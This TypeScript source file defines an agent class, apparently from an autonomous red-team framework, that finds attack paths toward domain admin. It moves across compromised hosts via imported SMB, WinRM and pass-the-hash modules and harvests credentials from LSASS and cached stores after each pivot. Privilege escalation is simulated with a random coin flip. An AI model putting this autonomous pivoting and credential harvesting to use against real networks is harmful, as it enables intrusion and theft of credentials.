/**
 * Lateral Movement Agent
 * Specializes in autonomous lateral movement across compromised networks
 * Integrates with credential vault and pathfinder for intelligent movement decisions
 */

import { BaseAgent } from '../../swarm/agents/base-agent';
import { AgentConfig, AgentCapability, AgentMessage } from '../../swarm/types';
import { MessageBus } from '../../swarm/communication/message-bus';
import logger from '../../logger';
import { pathfinder } from '../pathfinder';
import { credentialVault } from '../credential-vault';
import { smbExecution } from '../techniques/smb';
import { winrmExecution } from '../techniques/winrm';
import { passTheHashExecution } from '../techniques/pass-the-hash';
import type {
  LateralMovementRequest,
  LateralMovementResult,
  CompromisedHost,
  PrivilegeLevel,
  MovementTechnique
} from '../types';

interface LateralMovementTask {
  type: 'discover_paths' | 'execute_movement' | 'auto_pivot' | 'escalate_privileges';
  sourceHostId?: string;
  targetHostId?: string;
  targetPrivilege?: PrivilegeLevel;
  technique?: MovementTechnique;
  credentialId?: string;
  options?: any;
}

interface LateralMovementResultExtended {
  type: string;
  success: boolean;
  paths?: any[];
  movementResult?: LateralMovementResult;
  compromisedHosts?: number;
  credentialsFound?: number;
  error?: string;
  timestamp: Date;
}

export class LateralMovementAgent extends BaseAgent {
  private activeMovements: Map<string, LateralMovementRequest>;
  private movementHistory: Map<string, LateralMovementResult[]>;
  private autoPilotEnabled: boolean;

  constructor(config: AgentConfig, messageBus: MessageBus) {
    super(config, messageBus);
    this.activeMovements = new Map();
    this.movementHistory = new Map();
    this.autoPilotEnabled = false;
  }

  protected getAgentTools(): any[] {
    return [
      {
        name: 'discover_attack_paths',
        description: 'Discover attack paths from a compromised host to target privilege level',
        parameters: {
          sourceHostId: { type: 'string', required: true },
          targetPrivilege: { type: 'string', required: false }
        }
      },
      {
        name: 'execute_lateral_movement',
        description: 'Execute lateral movement using a specific technique',
        parameters: {
          sourceHostId: { type: 'string', required: true },
          targetHostId: { type: 'string', required: true },
          technique: { type: 'string', required: true },
          credentialId: { type: 'string', required: true }
        }
      },
      {
        name: 'auto_pivot',
        description: 'Automatically pivot through network to reach target privilege',
        parameters: {
          sourceHostId: { type: 'string', required: true },
          targetPrivilege: { type: 'string', required: false }
        }
      },
      {
        name: 'harvest_credentials',
        description: 'Harvest credentials from a compromised host',
        parameters: {
          hostId: { type: 'string', required: true },
          methods: { type: 'array', required: true }
        }
      }
    ];
  }

  protected async executeTask(task: LateralMovementTask): Promise<LateralMovementResultExtended> {
    logger.info(`LateralMovementAgent executing ${task.type}`);

    switch (task.type) {
      case 'discover_paths':
        return await this.discoverAttackPaths(task.sourceHostId, task.targetPrivilege);
      case 'execute_movement':
        return await this.executeLateralMovement(
          task.sourceHostId!,
          task.targetHostId!,
          task.technique!,
          task.credentialId!,
          task.options
        );
      case 'auto_pivot':
        return await this.autoPivot(task.sourceHostId!, task.targetPrivilege);
      case 'escalate_privileges':
        return await this.escalatePrivileges(task.sourceHostId!, task.options);
      default:
        throw new Error(`Unknown lateral movement task type: ${task.type}`);
    }
  }

  private async discoverAttackPaths(
    sourceHostId?: string,
    targetPrivilege: PrivilegeLevel = 'domain_admin'
  ): Promise<LateralMovementResultExtended> {
    try {
      if (!sourceHostId) {
        throw new Error('Source host ID is required for path discovery');
      }

      logger.info(`Discovering attack paths from ${sourceHostId} to ${targetPrivilege}`);

      const paths = await pathfinder.discoverAttackPaths(sourceHostId, targetPrivilege);

      return {
        type: 'discover_paths',
        success: true,
        paths,
        timestamp: new Date()
      };
    } catch (error) {
      logger.error('Failed to discover attack paths:', error);
      return {
        type: 'discover_paths',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        timestamp: new Date()
      };
    }
  }

  private async executeLateralMovement(
    sourceHostId: string,
    targetHostId: string,
    technique: MovementTechnique,
    credentialId: string,
    options?: any
  ): Promise<LateralMovementResultExtended> {
    try {
      logger.info(`Executing ${technique} from ${sourceHostId} to ${targetHostId}`);

      const request: LateralMovementRequest = {
        sourceHostId,
        targetHostId,
        technique,
        credentialId,
        proxyConfig: options?.proxyConfig,
        options
      };

      let result: LateralMovementResult;

      switch (technique) {
        case 'smb':
          result = await smbExecution.execute(request);
          break;
        case 'winrm':
          result = await winrmExecution.execute(request);
          break;
        case 'pth':
          result = await passTheHashExecution.execute(request);
          break;
        default:
          throw new Error(`Unsupported technique: ${technique}`);
      }

      // Track movement history
      const history = this.movementHistory.get(sourceHostId) || [];
      history.push(result);
      this.movementHistory.set(sourceHostId, history);

      return {
        type: 'execute_movement',
        success: result.success,
        movementResult: result,
        timestamp: new Date()
      };
    } catch (error) {
      logger.error('Failed to execute lateral movement:', error);
      return {
        type: 'execute_movement',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        timestamp: new Date()
      };
    }
  }

  private async autoPivot(
    sourceHostId: string,
    targetPrivilege: PrivilegeLevel = 'domain_admin'
  ): Promise<LateralMovementResultExtended> {
    try {
      logger.info(`Auto-pivoting from ${sourceHostId} to ${targetPrivilege}`);

      // Get recommended path
      const recommendedPath = await pathfinder.getRecommendedPath(sourceHostId, targetPrivilege);

      if (!recommendedPath) {
        throw new Error('No viable attack path found');
      }

      let compromisedHosts = 0;
      let credentialsFound = 0;

      // Execute movement along the path
      for (let i = 0; i < recommendedPath.edges.length; i++) {
        const edge = recommendedPath.edges[i];
        const sourceNode = recommendedPath.nodes[i];
        const targetNode = recommendedPath.nodes[i + 1];

        // Find appropriate credential
        const credentials = await credentialVault.getCredentialsByHost(sourceNode.hostId);
        if (credentials.length === 0) {
          logger.warn(`No credentials found for host ${sourceNode.hostId}`);
          continue;
        }

        const credential = credentials[0]; // Use first available credential

        const result = await this.executeLateralMovement(
          edge.fromHostId,
          edge.toHostId,
          edge.technique,
          credential.id
        );

        if (result.success && result.movementResult?.success) {
          compromisedHosts++;

          // Harvest credentials from newly compromised host
          const harvestResult = await credentialVault.harvestCredentials({
            hostId: edge.toHostId,
            methods: ['lsass', 'cached']
          });

          if (harvestResult.success) {
            credentialsFound += harvestResult.credentials.length;
          }
        } else {
          logger.warn(`Failed to move from ${edge.fromHostId} to ${edge.toHostId}`);
          break;
        }
      }

      return {
        type: 'auto_pivot',
        success: true,
        compromisedHosts,
        credentialsFound,
        timestamp: new Date()
      };
    } catch (error) {
      logger.error('Auto-pivot failed:', error);
      return {
        type: 'auto_pivot',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        timestamp: new Date()
      };
    }
  }

  private async escalatePrivileges(
    hostId: string,
    options?: any
  ): Promise<LateralMovementResultExtended> {
    try {
      logger.info(`Attempting privilege escalation on ${hostId}`);

      // This would integrate with a privilege escalation agent
      // For MVP, we'll simulate the escalation
      const host = await this.getHost(hostId);
      if (!host) {
        throw new Error('Host not found');
      }

      // Simulate privilege escalation
      const escalated = Math.random() > 0.5;

      if (escalated) {
        // Update host privileges in database
        await this.updateHostPrivileges(hostId, 'admin');
      }

      return {
        type: 'escalate_privileges',
        success: escalated,
        timestamp: new Date()
      };
    } catch (error) {
      logger.error('Privilege escalation failed:', error);
      return {
        type: 'escalate_privileges',
        success: false,
        error: error instanceof Error ? error.message : 'Unknown error',
        timestamp: new Date()
      };
    }
  }

  private async getHost(hostId: string): Promise<CompromisedHost | null> {
    // This would query the database
    // For MVP, return null
    return null;
  }

  private async updateHostPrivileges(hostId: string, privileges: PrivilegeLevel): Promise<void> {
    // This would update the database
    logger.info(`Updating host ${hostId} privileges to ${privileges}`);
  }

  enableAutoPilot(): void {
    this.autoPilotEnabled = true;
    logger.info('LateralMovementAgent auto-pilot enabled');
  }

  disableAutoPilot(): void {
    this.autoPilotEnabled = false;
    logger.info('LateralMovementAgent auto-pilot disabled');
  }

  getMovementHistory(hostId: string): LateralMovementResult[] {
    return this.movementHistory.get(hostId) || [];
  }

  clearMovementHistory(hostId: string): void {
    this.movementHistory.delete(hostId);
  }
}